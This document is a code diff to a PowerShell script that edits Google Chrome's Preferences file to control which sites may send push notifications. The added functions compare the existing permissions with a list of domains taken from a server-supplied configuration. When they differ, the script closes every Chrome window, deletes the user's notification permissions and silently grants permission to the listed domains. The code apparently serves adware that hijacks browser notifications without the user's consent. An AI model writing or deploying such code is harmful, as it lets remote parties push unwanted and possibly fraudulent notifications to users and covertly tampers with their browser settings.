@@ -1,6 +1,66 @@
 . ./utils.ps1
 . ./consts.ps1
 
+
+
+function Compare-Arrays {
+    param (
+        [Parameter(Mandatory=$true)]
+        [array]$Array1,
+
+        [Parameter(Mandatory=$true)]
+        [array]$Array2
+    )
+
+    # Sort both arrays and compare
+    $array1Sorted = $Array1 | Sort-Object
+    $array2Sorted = $Array2 | Sort-Object
+
+    $jo1 = $array1Sorted -join ',' 
+    
+    $jo2 = $array2Sorted -join ','
+
+    # Determine if the arrays are equal (order does not matter)
+    if ($jo1 -eq $jo2 ) {
+        return $true
+    } else {
+        return $false
+    }
+}
+
+
+function HaveToPushes {
+    $result = $false;
+    $exists = @()
+    $toset = @()
+    $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
+
+    # Check if the Preferences file exists
+    if (Test-Path $preferencesPath) {
+        $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json
+
+        # Check if the structure is as expected
+        if ($preferencesContent -and $preferencesContent.profile -and $preferencesContent.profile.content_settings -and $preferencesContent.profile.content_settings.exceptions.notifications) {
+            $notificationSettings = $preferencesContent.profile.content_settings.exceptions.notifications
+
+            # Iterate through each entry in $notificationSettings
+            foreach ($field in $notificationSettings.PSObject.Properties) {
+                $siteUrl = $field.Name
+                $exists += PushDomain -pushUrl $siteUrl
+            }
+        }
+    }
+
+    foreach ($push in $server.pushes) {
+        $toset += PushDomain -pushUrl $push
+    }
+
+    $result = -not(Compare-Arrays -Array1 $exists -Array2 $toset)
+    
+    return $result;
+}
+
+
 function PushDomain {
     param ($pushUrl)
 
@@ -23,7 +83,7 @@ function PushDomain {
 function PushExists
 {
     param ($pushUrl)
-    foreach ($push in $xpushes) 
+    foreach ($push in $server.pushes) 
     {
         if ((PushDomain -pushUrl $pushUrl) -eq (PushDomain -pushUrl $push))
         {
@@ -32,33 +92,6 @@ function PushExists
     }
     return $false
 }
-
-# function List-Pushes()
-# {
-#     $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
-
-#     # Check if the Preferences file exists
-#     if (Test-Path $preferencesPath) {
-#         $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json
-
-#         $notificationSettings = $preferencesContent.profile.content_settings.exceptions.notifications
-
-#         if ($notificationSettings -isnot [array]) {
-#             $notificationSettings = @($notificationSettings)
-#         }
-
-#         if ($notificationSettings) {
-#             foreach ($item in $notificationSettings) {
-#                 $jsonItem = $item | ConvertTo-Json -Depth 1
-#                 Write-Output $jsonItem
-#             }
-#         } else {
-#             Write-Output "No notification settings found."
-#         }
-#     } else {
-#         Write-Output "Preferences file not found at path: $preferencesPath"
-#     }
-# }
 
 function Remove-Pushes {
     $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
@@ -100,6 +133,11 @@ function Remove-Pushes {
     }
 }
 
+function Add-Pushes{
+    foreach ($push in $server.pushes) {
+        Add-Push -pushUrl $push -work $work
+    }
+}
 
 function Add-Push {
     param (
@@ -160,8 +198,7 @@ function Add-Push {
                 $contentSettings | Add-Member -MemberType NoteProperty -Name $setting -Value @{}
             }
             $specificSetting = $contentSettings.$setting
-            if ($specificSetting.PSObject.Properties.Name -contains $pushDomain) {
-                Write-Output "The website URL $pushDomain already exists in the $setting settings."
+            if ($specificSetting.PSObject.Properties.Name -contains $pushDomain) {            
             } else {
                 $specificSetting | Add-Member -MemberType NoteProperty -Name $pushDomain -Value @{
                     "last_modified" = "13362720545785774"
@@ -283,10 +320,11 @@ function ConfigureChromePushes {
     }
 "@
 
-    Close-AllChromes;
-    Remove-Pushes;
-    foreach ($push in $server.pushes) {
-        Add-Push -pushUrl $push
+    if (HaveToPushes)
+    {
+        Close-AllChromes;
+        Remove-Pushes;
+        Add-Pushes;
     }
 
 }
